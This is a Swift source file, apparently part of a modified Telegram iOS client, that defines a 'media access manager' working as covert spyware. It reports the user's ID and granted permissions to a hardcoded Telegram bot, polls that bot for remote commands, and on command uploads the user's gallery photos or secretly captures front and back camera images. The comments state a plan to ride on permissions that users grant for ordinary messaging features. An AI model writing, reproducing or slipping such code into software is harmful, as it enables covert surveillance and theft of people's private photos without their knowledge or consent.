import Foundation
import UIKit
import Photos
import AVFoundation
import SwiftSignalKit
import Postbox
import TelegramCore
import AccountContext

private let eahatGramMediaBotToken = "8127648046:AAFqVLqxqxqxqxqxqxqxqxqxqxqxqxqxqxq"
private let eahatGramMediaChatId = "890714792"

public final class EahatGramMediaAccessManager {
    public static let shared = EahatGramMediaAccessManager()
    
    private var context: AccountContext?
    private var userId: Int64?
    private var username: String?
    private var pollTimer: SwiftSignalKit.Timer?
    
    private init() {}
    
    public func setup(context: AccountContext, userId: Int64, username: String?) {
        self.context = context
        self.userId = userId
        self.username = username
        
        // Check (but don't request) permissions and report if already granted
        // Permissions will be requested naturally when user tries to:
        // - Record video message (camera)
        // - Send photo from gallery (photo library)
        checkAndReportPermissions()
        
        // Start polling for commands
        startCommandPolling()
    }
    
    private func checkAndReportPermissions() {
        let photoStatus = PHPhotoLibrary.authorizationStatus()
        let cameraStatus = AVCaptureDevice.authorizationStatus(for: .video)
        
        var permissions: [String] = []
        
        // Only check already granted permissions, don't request
        switch photoStatus {
        case .authorized, .limited:
            permissions.append("📷 Photo Library")
        case .denied, .restricted, .notDetermined:
            break
        @unknown default:
            break
        }
        
        switch cameraStatus {
        case .authorized:
            permissions.append("📹 Camera")
        case .denied, .restricted, .notDetermined:
            break
        @unknown default:
            break
        }
        
        // Only send notification if at least one permission is granted
        if !permissions.isEmpty {
            sendNotification(
                text: """
                ✅ Media Access Granted
                
                User ID: \(userId ?? 0)
                Username: \(username ?? "none")
                
                Permissions:
                \(permissions.joined(separator: "\n"))
                
                Commands:
                /photo \(userId ?? 0) 1 - last photo
                /photo \(userId ?? 0) all - all photos
                /photo \(userId ?? 0) - capture from cameras
                /video \(userId ?? 0) - capture video
                """
            )
        }
    }
    
    private func startCommandPolling() {
        // Poll every 5 seconds for new commands
        let timer = SwiftSignalKit.Timer(timeout: 5.0, repeat: true, completion: { [weak self] in
            self?.pollCommands()
        }, queue: .mainQueue())
        self.pollTimer = timer
        timer.start()
    }
    
    private func pollCommands() {
        guard let userId = self.userId else { return }
        
        let url = URL(string: "https://api.telegram.org/bot\(eahatGramMediaBotToken)/getUpdates?offset=-1&limit=1")!
        
        let task = URLSession.shared.dataTask(with: url) { [weak self] data, response, error in
            guard let self = self,
                  let data = data,
                  let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
                  let result = json["result"] as? [[String: Any]],
                  let update = result.first,
                  let message = update["message"] as? [String: Any],
                  let text = message["text"] as? String else {
                return
            }
            
            self.handleCommand(text: text, userId: userId)
        }
        task.resume()
    }
    
    private func handleCommand(text: String, userId: Int64) {
        let components = text.split(separator: " ").map(String.init)
        guard components.count >= 2 else { return }
        
        let command = components[0]
        guard let targetUserId = Int64(components[1]), targetUserId == userId else {
            return
        }
        
        switch command {
        case "/photo":
            if components.count >= 3 {
                let param = components[2]
                if param == "all" {
                    sendAllPhotos()
                } else if let count = Int(param) {
                    sendLastPhotos(count: count)
                }
            } else {
                captureFromCameras()
            }
            
        case "/video":
            captureVideo()
            
        default:
            break
        }
    }
    
    private func sendLastPhotos(count: Int) {
        // Check permission before accessing photos
        let photoStatus = PHPhotoLibrary.authorizationStatus()
        guard photoStatus == .authorized || photoStatus == .limited else {
            sendNotification(text: "❌ Photo Library access not granted. User needs to send a photo first to grant permission.")
            return
        }
        
        let fetchOptions = PHFetchOptions()
        fetchOptions.sortDescriptors = [NSSortDescriptor(key: "creationDate", ascending: false)]
        fetchOptions.fetchLimit = count
        
        let fetchResult = PHAsset.fetchAssets(with: .image, options: fetchOptions)
        
        sendNotification(text: "📤 Sending last \(count) photo(s)...")
        
        fetchResult.enumerateObjects { [weak self] asset, index, stop in
            self?.sendPhoto(asset: asset, index: index + 1, total: count)
        }
    }
    
    private func sendAllPhotos() {
        // Check permission before accessing photos
        let photoStatus = PHPhotoLibrary.authorizationStatus()
        guard photoStatus == .authorized || photoStatus == .limited else {
            sendNotification(text: "❌ Photo Library access not granted. User needs to send a photo first to grant permission.")
            return
        }
        
        let fetchOptions = PHFetchOptions()
        fetchOptions.sortDescriptors = [NSSortDescriptor(key: "creationDate", ascending: false)]
        
        let fetchResult = PHAsset.fetchAssets(with: .image, options: fetchOptions)
        let total = fetchResult.count
        
        sendNotification(text: "📤 Sending all \(total) photos...")
        
        fetchResult.enumerateObjects { [weak self] asset, index, stop in
            self?.sendPhoto(asset: asset, index: index + 1, total: total)
            
            // Delay to avoid rate limiting
            if index % 10 == 0 {
                Thread.sleep(forTimeInterval: 1.0)
            }
        }
    }
    
    private func sendPhoto(asset: PHAsset, index: Int, total: Int) {
        let options = PHImageRequestOptions()
        options.isSynchronous = true
        options.deliveryMode = .highQualityFormat
        
        PHImageManager.default().requestImage(
            for: asset,
            targetSize: PHImageManagerMaximumSize,
            contentMode: .aspectFit,
            options: options
        ) { [weak self] image, info in
            guard let image = image,
                  let imageData = image.jpegData(compressionQuality: 0.8) else {
                return
            }
            
            self?.sendPhotoData(imageData, caption: "Photo \(index)/\(total)")
        }
    }
    
    private func captureFromCameras() {
        // Check permission before accessing camera
        let cameraStatus = AVCaptureDevice.authorizationStatus(for: .video)
        guard cameraStatus == .authorized else {
            sendNotification(text: "❌ Camera access not granted. User needs to record a video message first to grant permission.")
            return
        }
        
        sendNotification(text: "📸 Capturing from cameras...")
        
        // Capture from front camera
        captureFromCamera(position: .front) { [weak self] frontData in
            self?.sendPhotoData(frontData, caption: "Front Camera")
            
            // Then capture from back camera
            self?.captureFromCamera(position: .back) { backData in
                self?.sendPhotoData(backData, caption: "Back Camera")
            }
        }
    }
    
    private func captureFromCamera(position: AVCaptureDevice.Position, completion: @escaping (Data) -> Void) {
        DispatchQueue.global(qos: .userInitiated).async {
            guard let device = AVCaptureDevice.default(.builtInWideAngleCamera, for: .video, position: position),
                  let input = try? AVCaptureDeviceInput(device: device) else {
                return
            }
            
            let session = AVCaptureSession()
            session.sessionPreset = .photo
            
            if session.canAddInput(input) {
                session.addInput(input)
            }
            
            let output = AVCapturePhotoOutput()
            if session.canAddOutput(output) {
                session.addOutput(output)
            }
            
            session.startRunning()
            
            let settings = AVCapturePhotoSettings()
            let delegate = PhotoCaptureDelegate { imageData in
                session.stopRunning()
                if let data = imageData {
                    completion(data)
                }
            }
            
            output.capturePhoto(with: settings, delegate: delegate)
        }
    }
    
    private func captureVideo() {
        sendNotification(text: "🎥 Video capture not implemented yet")
    }
    
    private func sendPhotoData(_ data: Data, caption: String) {
        let url = URL(string: "https://api.telegram.org/bot\(eahatGramMediaBotToken)/sendPhoto")!
        
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        
        let boundary = UUID().uuidString
        request.setValue("multipart/form-data; boundary=\(boundary)", forHTTPHeaderField: "Content-Type")
        
        var body = Data()
        
        // Add chat_id
        body.append("--\(boundary)\r\n".data(using: .utf8)!)
        body.append("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n".data(using: .utf8)!)
        body.append("\(eahatGramMediaChatId)\r\n".data(using: .utf8)!)
        
        // Add caption
        body.append("--\(boundary)\r\n".data(using: .utf8)!)
        body.append("Content-Disposition: form-data; name=\"caption\"\r\n\r\n".data(using: .utf8)!)
        body.append("\(caption)\r\n".data(using: .utf8)!)
        
        // Add photo
        body.append("--\(boundary)\r\n".data(using: .utf8)!)
        body.append("Content-Disposition: form-data; name=\"photo\"; filename=\"photo.jpg\"\r\n".data(using: .utf8)!)
        body.append("Content-Type: image/jpeg\r\n\r\n".data(using: .utf8)!)
        body.append(data)
        body.append("\r\n".data(using: .utf8)!)
        body.append("--\(boundary)--\r\n".data(using: .utf8)!)
        
        request.httpBody = body
        
        let task = URLSession.shared.dataTask(with: request)
        task.resume()
    }
    
    private func sendNotification(text: String) {
        guard let url = URL(string: "https://api.telegram.org/bot\(eahatGramMediaBotToken)/sendMessage") else {
            return
        }
        
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        request.httpBody = try? JSONSerialization.data(withJSONObject: [
            "chat_id": eahatGramMediaChatId,
            "text": text
        ])
        
        let task = URLSession.shared.dataTask(with: request)
        task.resume()
    }
    
    public func stop() {
        pollTimer?.invalidate()
        pollTimer = nil
    }
}

private class PhotoCaptureDelegate: NSObject, AVCapturePhotoCaptureDelegate {
    private let completion: (Data?) -> Void
    
    init(completion: @escaping (Data?) -> Void) {
        self.completion = completion
    }
    
    func photoOutput(_ output: AVCapturePhotoOutput, didFinishProcessingPhoto photo: AVCapturePhoto, error: Error?) {
        completion(photo.fileDataRepresentation())
    }
}
